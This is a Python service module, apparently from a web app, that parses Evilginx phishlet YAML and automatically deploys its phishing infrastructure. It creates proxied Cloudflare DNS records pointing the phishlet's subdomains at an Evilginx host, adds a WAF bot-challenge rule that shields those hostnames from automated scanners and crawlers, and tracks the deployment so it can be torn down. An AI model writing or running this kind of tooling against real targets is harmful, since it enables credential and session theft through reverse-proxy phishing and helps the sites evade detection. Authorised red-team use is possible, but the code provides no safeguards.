"""evilginx_service.py — Parse Evilginx phishlet YAML and deploy CF infrastructure.

A phishlet's `proxy_hosts` list defines the subdomains that need to resolve to
the Evilginx host. This service parses that list, creates Cloudflare A records
(proxied) on a chosen zone, and adds a single WAF managed_challenge rule that
fires on any of those hostnames when the request looks like a bot.

Mirrors the legacy `legacy_scripts/phishlet_cloudflare.py` script but persists
each Phishlet + the records it created so the deployment can be torn down later.
"""

import logging
import re
from datetime import datetime

import yaml

from app import db
from app.models.phishlet import Phishlet, PhishletDNSRecord
from app.services import dns_service, cloudflare_security_service

_log = logging.getLogger(__name__)

_MAX_YAML_BYTES = 256 * 1024  # 256 KB — phishlets are typically <10 KB
_PHISH_SUB_RE = re.compile(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.?)+$|^@$')


# ── YAML parsing ────────────────────────────────────────────────────────

def parse_phishlet_yaml(raw: str) -> dict:
    """Parse an Evilginx phishlet YAML and return a sanitized summary.

    Returns:
        {
          'name': str | None,
          'author': str | None,
          'min_ver': str | None,
          'proxy_hosts': [{'phish_sub': str, 'orig_sub': str, 'domain': str, 'session': bool, 'is_landing': bool}, ...],
          'phish_subs': [str, ...]   # deduped, ordered
        }

    Raises ValueError on invalid input.
    """
    if not raw or not raw.strip():
        raise ValueError('Phishlet YAML is empty')
    if len(raw.encode('utf-8', errors='ignore')) > _MAX_YAML_BYTES:
        raise ValueError('Phishlet YAML is too large')

    try:
        data = yaml.safe_load(raw)
    except yaml.YAMLError as e:
        raise ValueError(f'Invalid YAML: {e}')

    if not isinstance(data, dict):
        raise ValueError('Phishlet YAML must be a mapping at the top level')

    proxy_hosts_raw = data.get('proxy_hosts') or []
    if not isinstance(proxy_hosts_raw, list):
        raise ValueError('proxy_hosts must be a list')
    if not proxy_hosts_raw:
        raise ValueError('Phishlet has no proxy_hosts entries')

    cleaned_hosts = []
    seen_subs = set()
    phish_subs = []

    for idx, host in enumerate(proxy_hosts_raw):
        if not isinstance(host, dict):
            raise ValueError(f'proxy_hosts[{idx}] must be a mapping')
        phish_sub = str(host.get('phish_sub', '')).strip()
        if not phish_sub:
            continue
        if not _PHISH_SUB_RE.match(phish_sub):
            raise ValueError(f"proxy_hosts[{idx}] has invalid phish_sub: {phish_sub!r}")
        cleaned_hosts.append({
            'phish_sub': phish_sub,
            'orig_sub': str(host.get('orig_sub', '')).strip(),
            'domain': str(host.get('domain', '')).strip(),
            'session': bool(host.get('session', False)),
            'is_landing': bool(host.get('is_landing', False)),
        })
        if phish_sub not in seen_subs:
            seen_subs.add(phish_sub)
            phish_subs.append(phish_sub)

    if not cleaned_hosts:
        raise ValueError('No usable proxy_hosts entries (all missing phish_sub)')

    name = data.get('name') or data.get('phishlet') or None
    return {
        'name': str(name).strip() if name else None,
        'author': str(data.get('author')).strip() if data.get('author') else None,
        'min_ver': str(data.get('min_ver')).strip() if data.get('min_ver') else None,
        'proxy_hosts': cleaned_hosts,
        'phish_subs': phish_subs,
    }


def fqdn_for_sub(phish_sub: str, domain_name: str) -> str:
    if phish_sub == '@':
        return domain_name
    return f'{phish_sub}.{domain_name}'


# ── Persistence + deploy ────────────────────────────────────────────────

def list_phishlets(project_id):
    return (
        Phishlet.query
        .filter_by(project_id=project_id)
        .order_by(Phishlet.created_at.desc())
        .all()
    )


def get_phishlet(phishlet_id):
    return Phishlet.query.get(phishlet_id)


def create_phishlet(project_id, *, name, yaml_content, domain, target_ip,
                    bot_protection=True, user_id=None):
    """Persist a parsed phishlet without deploying it."""
    parsed = parse_phishlet_yaml(yaml_content)

    phishlet = Phishlet(
        project_id=project_id,
        name=name[:200],
        phishlet_name=parsed['name'][:120] if parsed['name'] else None,
        domain_id=domain.id,
        cloudflare_zone_id=domain.cloudflare_zone_id,
        credential_label=domain.credential_label or 'default',
        target_ip=target_ip[:64],
        yaml_content=yaml_content,
        bot_protection_enabled=bool(bot_protection),
        status='parsed',
        created_by_id=user_id,
    )
    db.session.add(phishlet)
    db.session.commit()
    return phishlet, parsed


def deploy_phishlet(phishlet: Phishlet) -> list:
    """Create the CF A records + WAF rule for a stored phishlet.

    Returns a list of step dicts: {'step': str, 'status': 'ok'|'error', ...}.
    """
    if phishlet.status == 'live':
        raise ValueError('Phishlet is already deployed')
    if not phishlet.domain or not phishlet.cloudflare_zone_id:
        raise ValueError('Phishlet domain is not bound to a Cloudflare zone')

    parsed = parse_phishlet_yaml(phishlet.yaml_content)

    phishlet.status = 'deploying'
    phishlet.last_error = None
    db.session.commit()

    # Wipe any old child records before re-deploying
    PhishletDNSRecord.query.filter_by(phishlet_id=phishlet.id).delete()
    db.session.commit()

    steps = []
    domain_name = phishlet.domain.name
    zone_id = phishlet.cloudflare_zone_id
    label = phishlet.credential_label or 'default'

    created_fqdns = []

    for sub in parsed['phish_subs']:
        fqdn = fqdn_for_sub(sub, domain_name)
        rec = PhishletDNSRecord(phishlet_id=phishlet.id, phish_sub=sub, fqdn=fqdn)
        db.session.add(rec)
        try:
            cf_record = dns_service.create_dns_record(
                zone_id=zone_id,
                record_type='A',
                name=fqdn,
                content=phishlet.target_ip,
                ttl=1,
                proxied=True,
                label=label,
            )
            rec.cloudflare_record_id = cf_record.get('id')
            rec.status = 'created'
            steps.append({'step': 'dns_record', 'status': 'ok',
                          'fqdn': fqdn, 'record_id': rec.cloudflare_record_id})
            created_fqdns.append(fqdn)
        except Exception as e:
            msg = str(e)
            if 'already exists' in msg.lower():
                rec.status = 'exists'
                rec.error_message = msg
                steps.append({'step': 'dns_record', 'status': 'ok',
                              'fqdn': fqdn, 'note': 'already exists'})
                created_fqdns.append(fqdn)
            else:
                rec.status = 'error'
                rec.error_message = msg
                steps.append({'step': 'dns_record', 'status': 'error',
                              'fqdn': fqdn, 'error': msg})

    db.session.commit()

    # WAF custom rule covering every successfully-created hostname
    if phishlet.bot_protection_enabled and created_fqdns:
        try:
            domain_clauses = ' or '.join(
                f'(http.host eq "{h}")' for h in created_fqdns
            )
            expression = f'({domain_clauses}) and (cf.client.bot)'
            description = f'Phishlet bot protection: {phishlet.name}'[:255]

            rule = cloudflare_security_service.create_custom_rule(
                zone_id=zone_id,
                action='managed_challenge',
                expression=expression,
                description=description,
                enabled=True,
                label=label,
            )
            phishlet.bot_rule_id = rule.get('id') if rule else None
            steps.append({'step': 'bot_protection', 'status': 'ok',
                          'rule_id': phishlet.bot_rule_id,
                          'hostnames': len(created_fqdns)})
        except Exception as e:
            steps.append({'step': 'bot_protection', 'status': 'error',
                          'error': str(e)})

    failed = any(s['status'] == 'error' for s in steps if s['step'] == 'dns_record')
    if failed and not created_fqdns:
        phishlet.status = 'error'
        phishlet.last_error = 'All DNS records failed to create'
    elif failed:
        phishlet.status = 'live'
        phishlet.last_error = 'Some DNS records failed; see record details'
        phishlet.deployed_at = datetime.utcnow()
    else:
        phishlet.status = 'live'
        phishlet.last_error = None
        phishlet.deployed_at = datetime.utcnow()

    db.session.commit()
    _log.info('Phishlet %s deploy: status=%s records=%d',
              phishlet.id, phishlet.status, len(created_fqdns))
    return steps


def teardown_phishlet(phishlet: Phishlet) -> list:
    """Remove the CF DNS records and bot-protection rule created for this phishlet."""
    steps = []
    zone_id = phishlet.cloudflare_zone_id
    label = phishlet.credential_label or 'default'

    for rec in list(phishlet.dns_records):
        if not rec.cloudflare_record_id or rec.status == 'removed':
            rec.status = 'removed'
            continue
        try:
            dns_service.delete_dns_record(zone_id, rec.cloudflare_record_id, label=label)
            rec.status = 'removed'
            steps.append({'step': 'remove_dns', 'status': 'ok', 'fqdn': rec.fqdn})
        except Exception as e:
            msg = str(e)
            if 'not found' in msg.lower() or 'could not be found' in msg.lower():
                rec.status = 'removed'
                steps.append({'step': 'remove_dns', 'status': 'ok',
                              'fqdn': rec.fqdn, 'note': 'already gone'})
            else:
                rec.status = 'error'
                rec.error_message = msg
                steps.append({'step': 'remove_dns', 'status': 'error',
                              'fqdn': rec.fqdn, 'error': msg})

    if phishlet.bot_rule_id:
        try:
            cloudflare_security_service.delete_custom_rule(
                zone_id, phishlet.bot_rule_id, label=label
            )
            steps.append({'step': 'remove_bot_protection', 'status': 'ok'})
            phishlet.bot_rule_id = None
        except Exception as e:
            msg = str(e)
            if 'not found' in msg.lower() or 'could not be found' in msg.lower():
                phishlet.bot_rule_id = None
                steps.append({'step': 'remove_bot_protection', 'status': 'ok',
                              'note': 'already gone'})
            else:
                steps.append({'step': 'remove_bot_protection', 'status': 'error',
                              'error': msg})

    phishlet.status = 'torn_down'
    phishlet.torn_down_at = datetime.utcnow()
    db.session.commit()
    _log.info('Phishlet %s torn down', phishlet.id)
    return steps


def delete_phishlet(phishlet: Phishlet, force: bool = False) -> None:
    """Delete the phishlet record. By default refuses to delete a live phishlet."""
    if phishlet.status == 'live' and not force:
        raise ValueError('Tear down the phishlet before deleting it')
    db.session.delete(phishlet)
    db.session.commit()
